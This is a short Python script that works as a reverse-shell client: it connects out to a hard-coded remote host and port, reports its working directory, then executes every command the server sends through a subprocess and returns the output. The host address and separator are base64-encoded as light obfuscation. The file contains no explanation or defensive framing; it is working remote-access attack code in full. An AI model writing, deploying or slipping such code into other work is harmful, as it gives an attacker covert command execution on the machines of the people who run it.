import socket
import os
import subprocess
import sys
import base64
from itertools import cycle
from threading import Thread

def encode_string(text):
    return base64.b64encode(text.encode()).decode()

def decode_string(encoded_text):
    return base64.b64decode(encoded_text.encode()).decode()

SERVER_HOST = encode_string("192.168.44.131")
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = encode_string("<sep>")

s = socket.socket()
s.connect((decode_string(SERVER_HOST), SERVER_PORT))
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
s.close()
